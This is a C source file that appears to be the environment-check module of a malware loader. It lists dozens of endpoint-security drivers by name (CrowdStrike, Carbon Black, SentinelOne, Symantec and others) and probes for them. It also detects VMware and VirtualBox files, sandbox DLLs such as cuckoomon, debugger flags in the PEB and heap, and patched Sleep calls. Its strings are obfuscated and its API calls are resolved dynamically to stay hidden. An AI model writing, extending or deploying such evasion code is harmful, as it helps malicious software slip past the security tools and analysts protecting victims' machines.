#include "detector.h"
#include "evasion.h"
#include <winternl.h>
#include <stdio.h>
#include <time.h>
#include <shlwapi.h>

// EDR Detection: Scan system driver directory for known EDR drivers
bool DetS()
{
    char *edrDriversEncoded[] = {
        // exclusion of sld.sys
        "[OBFS_ENC]atrsdfw.sys", "[OBFS_ENC]avgtpx86.sys", "[OBFS_ENC]avgtpx64.sys", "[OBFS_ENC]naswSP.sys", "[OBFS_ENC]edrsensor.sys", "[OBFS_ENC]CarbonBlackK.sys", "[OBFS_ENC]parity.sys", "[OBFS_ENC]cbk7.sys", "[OBFS_ENC]cbstream.sys", "[OBFS_ENC]csacentr.sys", "[OBFS_ENC]csaenh.sys", "[OBFS_ENC]csareg.sys", "[OBFS_ENC]csascr.sys", "[OBFS_ENC]csaav.sys", "[OBFS_ENC]csaam.sys", "[OBFS_ENC]rvsavd.sys", "[OBFS_ENC]cfrmd.sys", "[OBFS_ENC]cmdccav.sys", "[OBFS_ENC]cmdguard.sys", "[OBFS_ENC]CmdMnEfs.sys", "[OBFS_ENC]MyDLMPF.sys", "[OBFS_ENC]im.sys", "[OBFS_ENC]csagent.sys", "[OBFS_ENC]CybKernelTracker.sys", "[OBFS_ENC]CRExecPrev.sys", "[OBFS_ENC]CyOptics.sys", "[OBFS_ENC]CyProtectDrv32.sys", "[OBFS_ENC]CyProtectDrv64.sys", "[OBFS_ENC]groundling32.sys", "[OBFS_ENC]groundling64.sys", "[OBFS_ENC]esensor.sys", "[OBFS_ENC]edevmon.sys", "[OBFS_ENC]ehdrv.sys", "[OBFS_ENC]FeKern.sys", "[OBFS_ENC]WFP_MRT.sys", "[OBFS_ENC]xfsgk.sys", "[OBFS_ENC]fsatp.sys", "[OBFS_ENC]fshs.sys", "[OBFS_ENC]HexisFSMonitor.sys", "[OBFS_ENC]klifks.sys", "[OBFS_ENC]klifaa.sys", "[OBFS_ENC]Klifsm.sys", "[OBFS_ENC]mbamwatchog.sys", "[OBFS_ENC]mfeaskm.sys", "[OBFS_ENC]mfencfilter.sys", "[OBFS_ENC]PSINPROC.sys", "[OBFS_ENC]PSINFILE.sys", "[OBFS_ENC]amfsm.sys", "[OBFS_ENC]amm8660.sys", "[OBFS_ENC]amm6460.sys", "[OBFS_ENC]eaw.sys", "[OBFS_ENC]SAFE.sys", "[OBFS_ENC]SentinelMonitor.sys", "[OBFS_ENC]SAVOnAccess.sys", "[OBFS_ENC]savonaccess.sys", "[OBFS_ENC]pgpwdefs.sys", "[OBFS_ENC]GEProtection.sys", "[OBFS_ENC]diflt.sys", "[OBFS_ENC]sysMon.sys", "[OBFS_ENC]ssrfsf.sys", "[OBFS_ENC]emxdrv2.sys", "[OBFS_ENC]reghook.sys", "[OBFS_ENC]spbbcdsr.sys", "[OBFS_ENC]bhdrvx86.sys", "[OBFS_ENC]bhdrvx64.sys", "[OBFS_ENC]SISIPSFileFilter.sys", "[OBFS_ENC]symevent.sys", "[OBFS_ENC]vxfsrep.sys", "[OBFS_ENC]VirtFile.sys", "[OBFS_ENC]SymAFR.sys", "[OBFS_ENC]symefasi.sys", "[OBFS_ENC]symefa.sys", "[OBFS_ENC]symefa64.sys", "[OBFS_ENC]SymHsm.sys", "[OBFS_ENC]evmf.sys", "[OBFS_ENC]GEFCMP.sys", "[OBFS_ENC]VFSEnc.sys", "[OBFS_ENC]pgpfs.sys", "[OBFS_ENC]fencry.sys", "[OBFS_ENC]symrg.sys", "[OBFS_ENC]ndgdmk.sys", "[OBFS_ENC]ssfmonm.sys", "[OBFS_ENC]dlpwpdfltr.sys"};

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\drivers\\*.sys", &findFileData);

    if (hFind == INVALID_HANDLE_VALUE)
        return false;

    do
    {
        for (int i = 0; i < sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]); i++)
        {
            char *decodedDriver = obfs_decode(DECKEY, edrDriversEncoded[i]); // Decode Path
            if (!decodedDriver)
                continue;
            if (StrStrIA(findFileData.cFileName, decodedDriver))
            {
                myDebug(DEBUG_INFO, "Detected EDR: %s", decodedDriver);
                return true;
            }
        }
    } while (FindNextFileA(hFind, &findFileData));

    FindClose(hFind);
    return false;
}

// Sleep Patching Detection: Checks if Sleep(10000) completes normally
bool DetSl()
{
    LARGE_INTEGER startTime, endTime, frequency;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&startTime);

    Sleep(10000); // Expected to take ~10,000 ms

    QueryPerformanceCounter(&endTime);
    double elapsedMs = ((double)(endTime.QuadPart - startTime.QuadPart) / frequency.QuadPart) * 1000.0;

    if (elapsedMs < 9000.0 || elapsedMs > 11000.0)
    {
        myDebug(DEBUG_INFO, "Sleep timing anomaly detected: %f ms", elapsedMs);
        return true;
    }
    return false;
}

// Sandbox Detection files
bool DetSBF()
{

    pMod pPathFileExistsA = GetMod("shlwapi.dll", "PathFileExistsA");
    if (!pPathFileExistsA)
        return false;

    char *encodedPaths[] = {
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\Vmmouse.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vm3dgl.dll",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmdum.dll",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vm3dver.dll",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmtray.dll",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmci.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmx_svga.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmxnet.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxGuest.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxSF.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxVideo.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxService.exe",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxTray.exe",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxControl.exe"
    };

    int numPaths = sizeof(encodedPaths) / sizeof(encodedPaths[0]);

    for (int i = 0; i < numPaths; i++)
    {
        char *decodedPath = obfs_decode(DECKEY, encodedPaths[i]); // Decode Path
        if (!decodedPath)
            continue;

        if (pPathFileExistsA(decodedPath))
        {
            myDebug(DEBUG_INFO, "Sandbox file detected!");
            free(decodedPath);
            return true;
        }

        free(decodedPath);
    }
    return false;
}

// Filename Hash Detection: Checks if file name matches hash (common in sandboxes)
bool DetF()
{
    // Get a pointer to GetProcAddress
    pModC pGetProcAddress = (pModC)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetProcAddress"));
    // Get a pointer to GetModuleHandleA
    pMod pGetModuleHandleA = (pMod)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetModuleHandleA"));

    // Resolve Kernel32 base
    HMODULE hKernel32 = (HMODULE)pGetModuleHandleA(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"));

    // Resolve API functions dynamically
    FARPROC pGetModuleFileNameA = pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]GetModuleFileNameA"));
    pCreateFileA_t pCreateFileA = (pCreateFileA_t)pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]CreateFileA"));
    pGetFileSize_t pGetFileSize = (pGetFileSize_t)pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]GetFileSize"));
    pReadFile_t pReadFile = (pReadFile_t)pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]ReadFile"));
    pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));

    // Ensure all function pointers are valid
    if (!pGetModuleFileNameA || !pCreateFileA || !pGetFileSize || !pReadFile  || !pCloseHandle)
        return false;

    // Retrieve executable path stealthily
    char exePath[MAX_PATH] = {0};
    pGetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Open file without direct API calls
    HANDLE hFile = pCreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return false;

    // Get file size stealthily
    DWORD fileSize = pGetFileSize(hFile, NULL);

    // Allocate buffer on stack instead of HeapAlloc
    BYTE buffer[4096]; // Small stack buffer to avoid heap detection
    DWORD bytesRead;

    // Read file content stealthily
    pReadFile(hFile, buffer, min(fileSize, sizeof(buffer)), &bytesRead, NULL);

    // Close file handle
    pCloseHandle(hFile);

    // Implement custom XOR-based hashing instead of using Crypt APIs
    BYTE hash[16] = {0};
    for (DWORD i = 0; i < bytesRead; i++)
    {
        hash[i % 16] ^= buffer[i];
    }

    // Convert hash to a string
    char hashStr[33] = {0};
    for (int i = 0; i < 16; i++)
    {
        sprintf(&hashStr[i * 2], "%02X", hash[i]);
    }

    // Extract filename manually (avoid PathFindFileNameA)
    char *fileName = exePath;
    for (char *p = exePath; *p; p++)
    {
        if (*p == '\\')
            fileName = p + 1;
    }

    // Remove ".exe" manually
    char *ext = strrchr(fileName, '.');
    if (ext)
        *ext = '\0';

    // Stealthy string comparison using bitwise operations (avoid _stricmp)
    int match = 1;
    for (int i = 0; fileName[i] && hashStr[i]; i++)
    {
        if ((fileName[i] ^ hashStr[i]) != 0)
        {
            match = 0;
            break;
        }
    }
    if (match)
    {
        return true;
    }

    return false;
}

// Detect SandBox DLLs
bool DetSBD()
{
    char *encoded_realDLLs[] = {
        "[OBFS_ENC]kernel32.dll",
        "[OBFS_ENC]networkexplorer.dll",
        "[OBFS_ENC]NlsData0000.dll"
    };

    char *encoded_sandboxDLLs[] = {
        "[OBFS_ENC]cmdvrt.32.dll",
        "[OBFS_ENC]cuckoomon.dll",
        "[OBFS_ENC]cmdvrt.64.dll",
        "[OBFS_ENC]pstorec.dll",
        "[OBFS_ENC]avghookx.dll",
        "[OBFS_ENC]avghooka.dll",
        "[OBFS_ENC]snxhk.dll",
        "[OBFS_ENC]api_log.dll",
        "[OBFS_ENC]dir_watch.dll",
        "[OBFS_ENC]wpespy.dll"
    };

    // Get a pointer to GetModuleHandleA
    pMod pGetModuleHandleA = (pMod)GetMod("kernel32.dll", obfs_decode(DECKEY, "[OBFS_ENC]GetModuleHandleA")); 
    // Get a pointer to LoadLibraryA
    pMod pLoadLibraryA = (pMod)GetMod("kernel32.dll", obfs_decode(DECKEY, "[OBFS_ENC]LoadLibraryA"));

    for (int i = 0; i < sizeof(encoded_realDLLs) / sizeof(encoded_realDLLs[0]); i++)
    {
        char *decodedPath = obfs_decode(DECKEY, encoded_realDLLs[i]);
        HMODULE lib_inst = (HMODULE)pLoadLibraryA(decodedPath);
        if (lib_inst == NULL)
        {
            myDebug(DEBUG_INFO, "Checks : %s", decodedPath);
            free(decodedPath);
            return true;
        }
        free(decodedPath);
        FreeLibrary(lib_inst);
    }

    for (int i = 0; i < sizeof(encoded_sandboxDLLs) / sizeof(encoded_sandboxDLLs[0]); i++)
    {
        char *decodedPath = obfs_decode(DECKEY, encoded_sandboxDLLs[i]);
        HMODULE lib_inst = (HMODULE)pGetModuleHandleA(decodedPath);
        if (lib_inst != NULL)
        {
            printf("Checks : %s", decodedPath);
            free(decodedPath);
            return true;
        }
        free(decodedPath);
    }

    return false;
}

// Detect if NtGlobalFlag is present in PEB
bool DetFPEB()
{
// Get Process Environment Block (PEB)
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
    // NtGlobalFlag is at offset 0xBC in 64-bit PEB
    DWORD NtGlobalFlag = *(DWORD *)((BYTE *)peb + 0xBC);
#else // _WIN32
    PEB *peb = (PEB *)__readfsdword(0x30);
    // NtGlobalFlag is at offset 0x68 in 32-bit PEB
    DWORD NtGlobalFlag = *(DWORD *)((BYTE *)peb + 0x68);
#endif

    // Check NtGlobalFlag
    return NtGlobalFlag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS);
}

// Detect debugger flags in HEAP
bool DetFH()
{
// Get Process Environment Block (PEB)
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
    PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)peb + 0x30));
    DWORD dwHeapFlagsOffset = 0x70;      // 0x14 if Windows version inferior to Vista but who use old computers ? ;)
    DWORD dwHeapForceFlagsOffset = 0x74; // 0x18 if Windows version inferior to Vista but who use old computers ? ;)
#else                                    // _WIN32
    PEB *peb = (PEB *)__readfsdword(0x30);
    // Assuming no WOW64 processes for simplicity
    PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)peb + 0x18));
    DWORD dwHeapFlagsOffset = 0x40;      // 0x0C if Windows version inferior to Vista but who use old computers ? ;)
    DWORD dwHeapForceFlagsOffset = 0x44; // 0x10 if Windows version inferior to Vista but who use old computers ? ;)
#endif                                   // _WIN64

    DWORD dwHeapFlags = *(DWORD *)((PBYTE)pHeapBase + dwHeapFlagsOffset);
    DWORD dwHeapForceFlags = *(DWORD *)((PBYTE)pHeapBase + dwHeapForceFlagsOffset);

    // Check heap flags
    return (dwHeapFlags & ~HEAP_GROWABLE) || (dwHeapForceFlags != 0);
}

// Main Sandbox Detection Function
bool PerfomChecksEnv()
{
    myDebug(DEBUG_INFO, "Checking for NtGlobalFlag...");
    if (DetFPEB())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for Heap Flags...");
    if (DetFH())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for filename hash matching...");
    if (DetF())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for sandbox files...");
    if (DetSBF())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for EDRs...");
    if (DetS())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for sleep patching...");
    if (DetSl())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for dll...");
    if (DetSBD())
        return true; // avoiding further checks

    return false;
}
